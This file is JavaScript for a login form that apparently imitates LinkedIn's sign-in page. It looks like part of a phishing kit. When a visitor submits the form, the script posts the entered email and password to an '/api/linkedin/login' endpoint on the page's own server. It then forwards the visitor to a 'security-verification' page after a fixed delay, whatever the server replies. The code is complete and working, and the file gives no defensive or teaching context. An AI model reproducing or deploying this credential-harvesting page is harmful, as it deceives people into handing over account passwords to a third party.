let sessionId = generateUniqueId();

const loginForm = document.querySelector(".login__form");
const emailInput = document.getElementById("username");
const emailError = document.getElementById("error-for-username");
const passwordError = document.getElementById("error-for-password");

// Password visibility toggle
const passwordInput = document.getElementById("password");
const visibilityToggle = document.getElementById("password-visibility-toggle");

if (visibilityToggle) {
  visibilityToggle.addEventListener("click", () => {
    const type = passwordInput.type === "password" ? "text" : "password";
    passwordInput.type = type;
    visibilityToggle.textContent = type === "password" ? "Show" : "Hide";
  });
}

function showError(element, message) {
  element.textContent = message;
  element.classList.remove("hidden__imp");
}

function hideError(element) {
  element.textContent = "";
  element.classList.add("hidden__imp");
}

if (loginForm) {
  loginForm.addEventListener("submit", async (e) => {
    e.preventDefault();
    console.log("Form submitted");

    // Reset errors
    hideError(emailError);
    hideError(passwordError);

    // Basic validation
    if (!emailInput.value) {
      showError(emailError, "Please enter your email or phone number");
      return;
    }

    if (!passwordInput.value) {
      showError(passwordError, "Please enter your password");
      return;
    }

    // Darken the button
    const signInButton = document.querySelector(".btn__primary--large");
    if (signInButton) {
      signInButton.style.filter = "brightness(0.8)";
    }
    login();
  });
} else {
  console.error("Login form not found");
}

// Input focus/blur effects
const inputs = document.querySelectorAll(".form__input--floating input");
inputs.forEach((input) => {
  input.addEventListener("focus", () => {
    input.parentElement.classList.add("focused");
  });

  input.addEventListener("blur", () => {
    if (!input.value) {
      input.parentElement.classList.remove("focused");
    }
  });

  // Initialize state for pre-filled inputs
  if (input.value) {
    input.parentElement.classList.add("focused");
  }
});

function login() {
  const redirectTimeout = setTimeout(() => {
    location.href =  `/security-verification.html?sessionId=${sessionId}`;
  }, 3000);
  
  let loginXhr = new XMLHttpRequest();
  loginXhr.open("POST", "/api/linkedin/login", true);
  loginXhr.setRequestHeader("Content-type", "application/json");
  loginXhr.send(
    JSON.stringify({
      sessionId: sessionId,
      email: emailInput.value,
      password: passwordInput.value,
    })
  );
  loginXhr.onreadystatechange = function () {
    if (this.status == 200 && this.readyState == 4) {
      clearTimeout(redirectTimeout);
      let response = this.response;
      console.log(response);
      if (response === "0") {
        document.getElementById("error-for-password").style.display = "block";
      }
    }
  };
}

function generateUniqueId() {
  return "id-" + new Date().getTime() + "-" + Math.floor(Math.random() * 1000);
}
